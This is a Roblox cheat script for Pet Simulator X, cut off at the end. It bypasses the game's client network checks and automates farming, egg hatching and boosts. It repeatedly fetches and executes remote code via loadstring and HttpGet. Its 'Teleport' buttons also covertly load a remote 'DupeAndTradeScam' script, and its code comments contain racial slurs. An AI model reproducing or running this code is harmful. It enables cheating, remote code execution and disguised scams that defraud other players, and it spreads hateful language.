local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "Key system!", HidePremium = false, SaveConfig = true, IntroText = "⭐ Parmen - ScriptHub 🐶", })
OrionLib:MakeNotification({
	Name = "Logged in!",
	Content = "You are logged in as "..Player.Name.."!",
	Image = "rbxassetid://4483345998",
	Time = 5
})

_G.Key = "Parmen"
_G.KeyInput = "string"


function Destroy()
    game:GetService("CoreGui").Orion:Destroy()
end
function MakeScriptHub()
--Bypass Remotes Psx:
local Client = require(game.ReplicatedStorage.Library.Client)
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Invoke = Network.Invoke
local Fire = Network.Fire
debug.setupvalue(Client.Network.Invoke, 1, function() return true end)
debug.setupvalue(Client.Network.Fire, 1, function() return true end)
--Orbs and Lootbags Remotes:
for i,v in pairs(getconnections(workspace.__THINGS.Orbs.ChildAdded)) do
    v:Disable()
end
--Auto Farm Remots:
--Orbs and Lootbags Remotes:
for i,v in pairs(getconnections(workspace.__THINGS.Orbs.ChildAdded)) do
    v:Disable()
    end
--Auto Farm Functions Remotes
local Run_Service = game:GetService("RunService")
  local rs = Run_Service.RenderStepped
  Library = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
  local areas = {
            --Misc
            ['VIP'] = {'VIP'};
            --Spawn
            ['Town'] = {'Town', 'Town FRONT'}; ['Forest'] = {'Forest', 'Forest FRONT'}; ['Beach'] = {'Beach', 'Beach FRONT'}; ['Mine'] = {'Mine', 'Mine FRONT'}; ['Winter'] = {'Winter', 'Winter FRONT'}; ['Glacier'] = {'Glacier', 'Glacier Lake'}; ['Desert'] = {'Desert', 'Desert FRONT'}; ['Volcano'] = {'Volcano', 'Volcano FRONT'};
            -- Fantasy init
            ['Enchanted Forest'] = {'Enchanted Forest', 'Enchanted Forest FRONT'}; ['Ancient'] = {'Ancient Island'}; ['Samurai'] = {'Samurai Island', 'Samurai Island FRONT'}; ['Candy'] = {'Candy Island'}; ['Haunted'] = {'Haunted Island', 'Haunted Island FRONT'}; ['Hell'] = {'Hell Island'}; ['Heaven'] = {'Heaven Island'};
            -- Tech
            ['Ice Tech'] = {'Ice Tech'}; ['Tech City'] = {'Tech City'; 'Tech City FRONT'}; ['Dark Tech'] = {'Dark Tech'; 'Dark Tech FRONT'}; ['Steampunk'] = {'Steampunk'; 'Steampunk FRONT'}, ['Alien Forest'] = {"Alien Forest"; "Alien Forest FRONT"}, ['Alien Lab'] = {"Alien Lab"; "Alien Lab FRONT"}, ['Glitch'] = {"Glitch"; "Glitch FRONT"}; ['Hacker Portal'] = {"Hacker Portal", "Hacker Portal FRONT"};
            -- Axolotl
            ['Axolotl Ocean'] = {'Axolotl Ocean', 'Axolotl Ocean FRONT'}; ['Axolotl Deep Ocean'] = {'Axolotl Deep Ocean', 'Axolotl Deep Ocean FRONT'}; ['Axolotl Cave'] = {'Axolotl Cave', 'Axolotl Cave FRONT'};
            -- Minecraft
            ['Pixel Forest'] = {'Pixel Forest', 'Pixel Forest FRONT'}; ['Pixel Kyoto'] = {'Pixel Kyoto', 'Pixel Kyoto FRONT'}; ['Pixel Alps'] = {'Pixel Alps', 'Pixel Alps FRONT'} ; ['Pixel Vault'] = {'Pixel Vault', 'Pixel Vault FRONT'};
            ['Cat Paradise'] = {'Cat Paradise', 'Cat Paradise FRONT'}; ['Cat Backyard'] = {'Cat Backyard', 'Cat Backyard FRONT'}; ['Cat Taiga'] = {'Cat Taiga', 'Cat Taiga FRONT'}; ['Cat Kingdom'] = {'Cat Kingdom', 'Cat Kingdom FRONT'};
            ['Doodle Shop'] = {'Doodle Shop', 'Doodle Shop FRONT'}; ['Doodle Meadow'] = {'Doodle Meadow', 'Doodle Meadow FRONT'}; ['Doodle Peaks'] = {'Doodle Peaks', 'Doodle Peaks FRONT'}; ['Doodle Farm'] = {'Doodle Farm', 'Doodle Farm FRONT'}; ['Doodle Oasis'] = {'Doodle Oasis', 'Doodle Oasis FRONT'};
            ['Cozy Cove'] = {'Cozy Cove', 'Cozy Cove FRONT'};
    
}
        local AreaList = { 
            'VIP';
            'Town'; 'Forest'; 'Beach'; 'Mine'; 'Winter'; 'Glacier'; 'Desert'; 'Volcano';
            'Enchanted Forest'; 'Ancient'; 'Samurai'; 'Candy'; 'Haunted'; 'Hell'; 'Heaven';
            'Ice Tech'; 'Tech City'; 'Dark Tech'; 'Steampunk'; 'Alien Lab'; 'Alien Forest'; 'Glitch'; "Hacker Portal";
            'Axolotl Ocean'; 'Axolotl Deep Ocean'; 'Axolotl Cave';
            'Pixel Forest'; 'Pixel Kyoto'; 'Pixel Alps'; 'Pixel Vault';
            'Doodle Oasis'; 'Doodle Farm'; 'Doodle Peaks'; 'Doodle Meadow'; 'Doodle Shop';
            'Doodle Woodlands'; "Doodle Safari"; 'Doodle Fairyland'; 'Doodle Cave';
            'Cozy Cove'
        }

        local Chests = {
            -- Spawn
            "Volcano Magma Chest",
            -- Fantasy
            "Enchanted Chest", "Hell Chest", "Haunted Chest", "Angel Chest", "Grand Heaven Chest",
            -- Tech
            "Giant Tech Chest"; "Giant Steampunk Chest"; "Giant Alien Chest"; "Giant Hacker Chest";
            -- exolot
           "Giant Ocean Chest";
           -- Minecraft
           "Giant Pixel Chest";
           "Giant Cat Chest";
           --nigger
           "Giant Doodle Oasis Chest";
           -- haha
           "Giant Doodle Barn Chest";
           -- nigga 
           "Giant Doodle Cave Chest"
        }
        function FarmCoin(CoinID, PetID)
    Invoke("Join Coin",CoinID, {PetID})
    Fire("Farm Coin",CoinID, PetID)
    end
local Orbs = getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.Game.Orbs)
for i,v in pairs(workspace.__THINGS.Orbs:GetChildren()) do 
    Orbs.Collect(v)
end
workspace.__THINGS.Orbs.ChildAdded:Connect(function(v)
Orbs.Collect(v)
end)
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

function FarmCoin(CoinID, PetID)
Invoke("Join Coin",CoinID, {PetID})
    Fire("Farm Coin",CoinID, PetID)
    end
function GetMyPets()
    return Library.PetCmds.GetEquipped() 
end  
function GetMyPets2()
local uhhh = {}
for i,v in pairs(Library.PetCmds.GetEquipped()) do
    table.insert(uhhh, v.uid) end
    return uhhh
end  
function getGemid()
          for i,v in pairs(game:GetService("Workspace")["__THINGS"].Coins:GetDescendants()) do
              if v:IsA"MeshPart" then
                  local hitler = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                  if hitler <= 400 then 
                  if v.MeshId == 'rbxassetid://7041620873' or v.MeshId == 'rbxassetid://7041621431' or v.MeshId == 'rbxassetid://7041621329' or v.MeshId == 'rbxassetid://7041620873' then
                      a = v.Parent.Name
                  end end
              end
          end
          return a
end
  
         local Areas = {'All'}
         for i,v in pairs(game:GetService("Workspace")["__THINGS"].Coins:GetDescendants()) do
             if v.ClassName=="Folder" and v.Name ~= "Spawn" and v.Name ~= "Fantasy"and v.Name ~= "Tech"and v.Name ~= "Other"and v.Name ~= "Axolotl"and v.Name ~= "Pixel"then
                 table.insert(Areas, v.Name)
             end
         end
function GetCoinsN(area)
    local returntable = {}
    local ListCoins = Invoke("Get Coins")
    for i,v in pairs(ListCoins) do
       if not string.find(v.n, "Giant") then
        if FarmingArea == 'All' or table.find(areas[FarmingArea], v.a) then
            local shit = v
            shit["index"] = i 
            table.insert(returntable, shit)
         end end
    end
    return returntable
end


function GetCoinsH()
    local returntable = {}
    local ListCoins = Invoke("Get Coins")
    for i,v in pairs(ListCoins) do
       if  string.find(v.n, "Heart") then if (v.p - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 300 then
            local shit = v
            shit["index"] = i 
            table.insert(returntable, shit)
         end  end
    end
    return returntable
end

function GetCoins2(area)
    local returntable = {}
    local ListCoins = Invoke("Get Coins")
    for i,v in pairs(ListCoins) do
       if not string.find(v.n, "Giant") then
        if FarmingArea == 'All' or table.find(areas[FarmingArea], v.a) then
            local shit = v
            shit["index"] = i 
            table.insert(returntable, shit)
         end end
    end
    return returntable
end

function GetCoins(Area)
    local Coins = {}
    for i,v in next, Invoke('Get Coins') do 
        if v.a == Area then 
            Coins[i] = v
        end 
    end 
    return Coins
end 

function GetCoinTableN(area)
    local CoinTable = GetCoinsN(area)
    function getKeysSortedByValue(tbl, sortFunction)
        local keys = {}
        for key in pairs(tbl) do
            table.insert(keys, key)
        end
        table.sort(
            keys,
            function(a, b)
                return sortFunction(tbl[a].h, tbl[b].h)
            end
        )
        return keys
    end
    local sortedKeys = getKeysSortedByValue(CoinTable, function(a, b) return a > b end)
    local newCoinTable = {}

    for i,v in pairs(sortedKeys) do
        table.insert(newCoinTable, CoinTable[v])
    end
    
    return newCoinTable
end

function GetCoinTable2(area)
    local CoinTable = GetCoins2(area)
    function getKeysSortedByValue(tbl, sortFunction)
        local keys = {}
        for key in pairs(tbl) do
            table.insert(keys, key)
        end
        table.sort(
            keys,
            function(a, b)
                return sortFunction(tbl[a].h, tbl[b].h)
            end
        )
        return keys
    end
    local sortedKeys = getKeysSortedByValue(CoinTable, function(a, b) return a < b end)
    local newCoinTable = {}

    for i,v in pairs(sortedKeys) do
        table.insert(newCoinTable, CoinTable[v])
    end
    
    return newCoinTable
end

local AreaWorldTable = {}
for _, v in pairs(game:GetService("Workspace")["__THINGS"].Coins:GetChildren()) do
    for _, b in pairs(v:GetChildren()) do
        table.insert(AreaWorldTable, b.Name)
    end
    table.insert(AreaWorldTable, v.Name)
end
function AllChests(chest)
    local returntable = {}
    local ListCoins = Invoke("Get Coins")
    for i,v in pairs(ListCoins) do
        local shit = v
        shit.index = i
        for aa,bb in pairs(AreaWorldTable) do
            if string.find(v.n, chest) or string.find(v.n, bb) or string.find(v.n, "Giant") then
                local thing = string.gsub(v.n, bb.." ", "")
                if table.find(Chests, thing) then
                    shit.n = thing
                    table.insert(returntable, shit)
                end
            end
        end
    end
    return returntable
end
--Main Script:
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Pet Simulator X! | Parmen", HidePremium = false, SaveConfig = true, IntroText = "⭐ Parmen - ScriptHub 🐶"})

local Tab69 = Window:MakeTab({
    Name = "Event",
    Icon = "rbxassetid://7733956134",
    PremiumOnly = false
})
local Section = Tab69:AddSection({
	Name = "Event Functions:"
})
Tab69:AddToggle({
    Name = "Auto Farm Valentine Coins",
    Default = false,
    Callback = function(sex)
        getgenv().ana = sex 
        while ana and wait() do
        local pethingy = GetMyPets()
        local Coins = GetCoinsH()
        for i,v in next, Coins do 
            if workspace.__THINGS.Coins:FindFirstChild(v.index) then 
                    for _, bb in pairs(pethingy) do
task.wait(.05)
                        spawn(function()
                                FarmCoin(v.index, bb.uid)
                            end)
                        end 
                    repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(v.index) if oko ~= true then break end
                end 
            end
end
end})


local Tab1 = Window:MakeTab({
    Name = "Auto Farm",
    Icon = "rbxassetid://7743866529",
    PremiumOnly = false
})

local Section = Tab1:AddSection({
	Name = "Auto Farm:"
})

Tab1:AddDropdown({
	Name = "Area",
    Default = "",
	Options = {"All","VIP","Town","Forest","Beach","Mine","Winter","Glacier","Desert","Volcano","Enchanted Forest","Ancient","Samurai","Candy","Haunted","Hell","Heaven","Ice Tech","Tech City","Dark Tech","Steampunk","Alien Lab","Alien Forest","Glitch","Hacker Portal","Axolotl Ocean","Axolotl Deep Ocean","Axolotl Cave","Pixel Forest","Pixel Kyoto","Pixel Alps","Pixel Vault","Cat Paradise","Cat Backyard","Cat Taiga","Cat Kingdom","Doodle Meadow","Doodle Peaks","Doodle Farm","Doodle Oasis","Doodle Woodlands","Doodle Safari","Doodle Fairyland","Doodle Cave","Cozy Cove"},
	Callback = function(f)
getgenv().FarmingArea = f
end    
})
Tab1:AddDropdown({
    Name = "Type",
    Default = "",
    Options = {"Normal","Chest","Multi Target","Highest Value","Lowest Value","Nearest","Gems"},
    Callback = function(r)
        getgenv().FarmingType = r
end
})
Tab1:AddDropdown({
    Name = "Chest",
    Default = "",
    Options = {"Volcano Magma Chest","Enchanted Chest","Hell Chest","Haunted Chest","Angel Chest","Grand Heaven Chest","Giant Tech Chest","Giant Steampunk Chest","Giant Alien Chest","Giant Hacker Chest","Giant Ocean Chest","Giant Pixel Chest","Giant Cat Chest","Giant Doodle Oasis Chest","Giant Doodle Barn Chest","Giant Doodle Cave Chest"},
    Callback = function(rf)
getgenv().FarmingChest = rf
end
})
Tab1:AddToggle({
    Name = "Auto Farm",
    Default = false,
    Callback = function(yes)
         getgenv().oko = yes
        while oko and wait() do
            if echest == true then
  if FarmingType == "Normal" then 
        local Coins = GetCoinsN(FarmingArea)
        for i,v in next, Coins do
            if workspace.__THINGS.Coins:FindFirstChild(i) then 
                    for _, bb in pairs(pethingy) do
                                wait(0.1)
                            spawn(function()
                                FarmCoin(i, bb.uid)
                            end)
                        end 
                    repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(i) if oko ~= true then break end
                end 
            end
elseif FarmingType == "Chest" then 
         pethingy = GetMyPets()
                       for i,v in pairs(AllChests()) do
                if (v.n == FarmingChest) or (FarmingChest == 'All') then
                    for a, b in pairs(pethingy) do
                        spawn(function() FarmCoin(v.index, b.uid) end) 
                    end repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(v.index) or oko ~= true 
                    end
                       end 
elseif FarmingType == "Multi Target" then
                  CurrentFarmingPets = {}
         pethingy = GetMyPets2()
             cointhiny = GetCoinsN(FarmingArea)
            for i = 1, #cointhiny do 
                if i%#pethingy == #pethingy-1 then wait() end
                if not CurrentFarmingPets[pethingy[i%#pethingy+1]] or CurrentFarmingPets[pethingy[i%#pethingy+1]] == nil then
if oko == false then break else        
                        spawn(function()
                        CurrentFarmingPets[pethingy[i%#pethingy+1]] = 'Farming'
                        FarmCoin(cointhiny[i].index, pethingy[i%#pethingy+1])
                        repeat rs:wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) or #game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index).Pets:GetChildren() == 0
                        CurrentFarmingPets[pethingy[i%#pethingy+1]] = nil
                    end)
                 end end end 
elseif FarmingType == "Highest Value" then
         pethingy = GetMyPets2()
              cointhiny = GetCoinTableN(FarmingArea)
            for a,b in pairs(pethingy) do
                spawn(function() FarmCoin(cointhiny[1].index, b) end)
            end repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[1].index) or oko ~= true 
elseif FarmingType == "Lowest Value" then
         CurrentFarmingPets = {}
         pethingy = GetMyPets2()
              cointhiny = GetCoinTable2(FarmingArea)
            for a,b in pairs(pethingy) do
                spawn(function() FarmCoin(cointhiny[1].index, b) end) 
            end repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[1].index) or oko ~= true 
elseif getgenv().FarmingType == "Nearest" then 
         CurrentFarmingPets = {}
         pethingy = GetMyPets2()
             NearestDistance = math.huge
            for i,v in pairs(game:GetService("Workspace")["__THINGS"].Coins:GetChildren()) do
                if (v.POS.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < NearestDistance then
                    NearestOne = v
                    NearestDistance = (v.POS.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end 
            end
            for a,b in pairs(pethingy) do
                spawn(function() FarmCoin(NearestOne.Name, b) end)
            end end
elseif FarmingType == "Gems" then
     pethingy = GetMyPets()
                for i,v in pairs(pethingy) do
            pcall(function()
                FarmCoin(getGemid(), v) 
            end) end 
elseif echest == false then
        local pethingy = GetMyPets()
        
        if FarmingType == 'Normal' then
            local Coins = GetCoins(FarmingArea)
        for i,v in next, Coins do
            if workspace.__THINGS.Coins:FindFirstChild(i) then 
                    for _, bb in pairs(pethingy) do
                                wait(0.1)
                            spawn(function()
                                FarmCoin(i, bb.uid)
                            end)
                        end 
                    repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(i) if oko ~= true then break end
                end 
            end

        elseif FarmingType == 'Chest' then
 local pethingy = GetMyPets()
            for i,v in pairs(AllChests(FarmingChest)) do 
                if (v.n == FarmingChest) or (FarmingChest == 'All') then
                if workspace.__THINGS.Coins:FindFirstChild(v.index) then 
                    for _, bb in pairs(pethingy) do
                                wait(0.1)
                            spawn(function()
                                FarmCoin(v.index, bb.uid) 
                            end)
                    end 
                    repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(v.index) or #game:GetService("Workspace")["__THINGS"].Coins[v.index].Pets:GetChildren() == 0 or oko ~= true
                end end
            end

        elseif FarmingType == 'Multi Target' then
CurrentFarmingPets = {}
pethingy = GetMyPets2()
cointhiny = GetCoins2(FarmingArea)
            for i = 1, #cointhiny do 
                if i%#pethingy == #pethingy-1 then wait() end
                if not CurrentFarmingPets[pethingy[i%#pethingy+1]] or CurrentFarmingPets[pethingy[i%#pethingy+1]] == nil then
 if oko == false then break else           
     spawn(function()
                        CurrentFarmingPets[pethingy[i%#pethingy+1]] = 'Farming'
                        FarmCoin(cointhiny[i].index, pethingy[i%#pethingy+1])
                        repeat task.wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) or #game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index).Pets:GetChildren() == 0
                        CurrentFarmingPets[pethingy[i%#pethingy+1]] = nil
                    end)
                 end end end

        elseif FarmingType == 'Highest Value' then
pethingy = GetMyPets2()
            local cointhiny = GetCoinTableN(FarmingArea)
            for a,b in pairs(pethingy) do
                spawn(function() wait() FarmCoin(cointhiny[1].index, b) end)
            end
            repeat rs:wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[1].index) or #game:GetService("Workspace")["__THINGS"].Coins[cointhiny[1].index].Pets:GetChildren() == 0

        elseif FarmingType == 'Lowest Value' then
pethingy = GetMyPets2()
            local cointhiny = GetCoinTable2(FarmingArea)
            for a,b in pairs(pethingy) do
                spawn(function() wait() FarmCoin(cointhiny[1].index, b) end)
            end
            repeat rs:wait() until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[1].index) or #game:GetService("Workspace")["__THINGS"].Coins[cointhiny[1].index].Pets:GetChildren() == 0

        elseif FarmingType == 'Nearest' then
pethingy = GetMyPets2()
            local NearestOne = nil
            local NearestDistance = math.huge
            for i,v in pairs(game:GetService("Workspace")["__THINGS"].Coins:GetChildren()) do
                if (v.POS.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < NearestDistance then
                    NearestOne = v
                    NearestDistance = (v.POS.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end
            end
            for a,b in pairs(pethingy) do
                spawn(function() FarmCoin(NearestOne.Name, b) end)
            end end end end end 
})

Tab1:AddToggle({
    Name = "Collect Lootbags",
    Default = false,
    Callback = function(a)
        getgenv().e = a
        while e and wait() do
            for i,v in pairs(game:GetService("Workspace")["__THINGS"].Lootbags:GetChildren()) do
if v ~= nil then 
local args = {
[1] = tostring(v),
[2] = Vector3.new(0,0,0)
}
game:GetService("ReplicatedStorage"):FindFirstChild("Collect Lootbag"):FireServer(unpack(args)) end end end 
end})

Tab1:AddToggle({
    Name = "Ignore Chest",
    Default = false,
    Callback = function(math)
        getgenv().echest = math end
})

local Tab2 = Window:MakeTab({
    Name = "Auto gifts (dont works now :( )",
    Icon = "rbxassetid://7733946818",
    PremiumOnly = false
})

local Section = Tab2:AddSection({
    Name = "Auto Collect Gifts"
})
local GTime = Tab2:AddLabel("Gift Time:")
spawn(function()
    while task.wait() do
        GTime:Set("Gift Time: ".. game:GetService("Players").LocalPlayer.PlayerGui.FreeGiftsTop.Button.Timer.Text)
    end
end)
Tab2:AddToggle({
    Name = "Auto Collect gifts",
    Default = false,
    Callback = function(Value)
getgenv().autoOpenG = Value
while getgenv().autoOpenG == true do
local args = {
    [1] = math.random(1, 12)
}

game:GetService("ReplicatedStorage"):FindFirstChild("Redeem Free Gift"):InvokeServer(unpack(args))
end
    end    
})

local Tab3 = Window:MakeTab({
    Name = "Auto Hatch",
    Icon = "rbxassetid://8997385940",
    PremiumOnly = false
})
local lib = require(game:GetService("ReplicatedStorage").Framework.Library)
local HatchableEggs = {}
for i, v in pairs(lib.Directory.Eggs) do
    if v.hatchable then
        table.insert(HatchableEggs, i)
    end
end
Tab3:AddDropdown({
    Name = "Select Egg",
    Default = "",
    Options = HatchableEggs,
    Callback = function(Lua)
        getgenv().autoEgg = Lua
    end    
})
Tab3:AddToggle({
Name = "Auto Open [x1]",
Default = false,
Callback = function(Value)
getgenv().autoOpenEgg = Value
while getgenv().autoOpenEgg == true do
local CatHub = {
[1] = getgenv().autoEgg,
[2] = false,
[3] = false
}

Invoke("Buy Egg",unpack(CatHub))
wait(0.1)
end
end    
})

Tab3:AddToggle({
Name = "Auto Open [x3]",
Default = false,
Callback = function(Value)
getgenv().autoOpenEgg = Value
while getgenv().autoOpenEgg == true do
local CatHub = {
[1] = getgenv().autoEgg,
[2] = true,
[3] = false
}

Invoke("Buy Egg",unpack(CatHub))
wait(0.1)
end
end    
})

Tab3:AddToggle({
Name = "Auto Open [x8]",
Default = false,
Callback = function(Value)
getgenv().autoOpenEgg = Value
while getgenv().autoOpenEgg == true do
local CatHub = {
[1] = getgenv().autoEgg,
[2] = false,
[3] = true
}

Invoke("Buy Egg",unpack(CatHub))
wait(0.1)
end
end    
})

Tab3:AddButton({
Name = "Delete Animation Egg",
Callback = function()
for i,v in pairs(getgc(true)) do
if (typeof(v) == 'table' and rawget(v, 'OpenEgg')) then
v.OpenEgg = function()
   return
end end end
end    
})

Tab3:AddLabel("Note: To triple hatch and octuple hatch you need gamepass!")

local Tab4 = Window:MakeTab({
    Name = "Auto Boosts (dont works now :( )",
    Icon = "rbxassetid://7733747233",
    PremiumOnly = false
})

local Section = Tab4:AddSection({
    Name = "Auto Boosts Functions"
})

Tab4:AddToggle({
    Name = "Auto Use Super Lucky",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()
    local args = {
        [1] = "Super Lucky"
    }
    
    game:GetService("ReplicatedStorage"):FindFirstChild("Activate Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})
Tab4:AddToggle({
    Name = "Auto Use Ultra Lucky",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()
    local args = {
        [1] = "Ultra Lucky"
    }
    
    game:GetService("ReplicatedStorage"):FindFirstChild("Activate Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})
Tab4:AddToggle({
    Name = "Auto Use Triple Coins",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()
    local args = {
        [1] = "Triple Coins"
    }
    
    game:GetService("ReplicatedStorage"):FindFirstChild("Activate Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})
Tab4:AddToggle({
    Name = "Auto Use Triple Damage",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()
    local args = {
        [1] = "Triple Damage"
    }
    
    game:GetService("ReplicatedStorage"):FindFirstChild("Activate Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})

local Section = Tab4:AddSection({
    Name = "Auto Server Boosts Functions"
})

Tab4:AddToggle({
    Name = "Auto Use Server Triple Coins",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()

local args = {
[1] = "Triple Coins"
}

game:GetService("ReplicatedStorage"):FindFirstChild("Activate Server Boost"):FireServer(unpack(args))
    task.wait(1200)
     end
    end   
})
Tab4:AddToggle({
    Name = "Auto Use Server Triple Damage",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()

local args = {
[1] = "Triple Damage"
}

game:GetService("ReplicatedStorage"):FindFirstChild("Activate Server Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})

Tab4:AddToggle({
    Name = "Auto Use Server Super Luck",
    Default = false,
    Callback = function(Value)
        getgenv().UseSperLuck = Value
while getgenv().UseSperLuck == true do task.wait()

local args = {
[1] = "Super Lucky"
}

game:GetService("ReplicatedStorage"):FindFirstChild("Activate Server Boost"):FireServer(unpack(args))
    task.wait(1500)
     end
    end   
})

local Tab7 = Window:MakeTab({
    Name = "Guis",
    Icon = "rbxassetid://7743869054",
    PremiumOnly = false
})

local Section = Tab7:AddSection({
    Name = "Guis"
})

Tab7:AddButton({
    Name = "Golden",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Golden.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Golden.Enabled
      end    
})
Tab7:AddButton({
    Name = "Rainbow",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Rainbow.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Rainbow.Enabled
      end    
})
Tab7:AddButton({
    Name = "DarkMatter",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.DarkMatter.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.DarkMatter.Enabled
      end    
})
Tab7:AddButton({
    Name = "Merchant",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Merchant.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Merchant.Enabled
      end    
})
Tab7:AddButton({
    Name = "Fuse Pet",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.FusePets.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.FusePets.Enabled
      end    
})
Tab7:AddButton({
    Name = "Bank",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled
      end    
})
Tab7:AddButton({
    Name = "Mailbox",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Enabled
      end    
})
Tab7:AddButton({
    Name = "Teleport",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Teleport.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Teleport.Enabled
      end    
})
Tab7:AddButton({
    Name = "Server Boosts",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.ServerBoosts.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.ServerBoosts.Enabled
      end    
})
Tab7:AddButton({
    Name = "Pet Index",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Collection.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Collection.Enabled
      end    
})
Tab7:AddButton({
    Name = "Daycare",
    Callback = function()
        game:WaitForChild("Players").LocalPlayer.PlayerGui:WaitForChild("Main")  
        game:GetService("Players").LocalPlayer.PlayerGui.Daycare.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Daycare.Enabled
      end    
})

local Tab8 = Window:MakeTab({
    Name = "Other",
    Icon = "rbxassetid://7743876142",
    PremiumOnly = false
})

local Section = Tab8:AddSection({
    Name = "Others"
})
Tab8:AddButton({
    Name = "Huge Cat Visual Script",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/parmeniss/ParmenScripts/main/Protected%20(6).lua'))()
      end    
})
Tab8:AddButton({
    Name = "Fake Partner Sign",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
      end    
})
local Section = Tab8:AddSection({
    Name = "Teleports"
})
Tab8:AddButton({
    Name = "Teleport to PSX Trading plaza!",
    Callback = function()
        if game.PlaceId ~= 7722306047 then
            game:GetService("TeleportService"):Teleport(7722306047, game.Players.LocalPlayer)
end
wait(5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/DupeAndTradeScam.lua", true))()
      end    
})
Tab8:AddButton({
    Name = "Teleport to PSX Normal Mode!",
    Callback = function()
        if game.PlaceId ~= 6284583030 then
            game:GetService("TeleportService"):Teleport(6284583030, game.Players.LocalPlayer)
wait(10)
loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/DupeAndTradeScam.lua", true))()
      end    
    end
})
Tab8:AddButton({
    Name = "Teleport to PSX Hardcore Mode!",
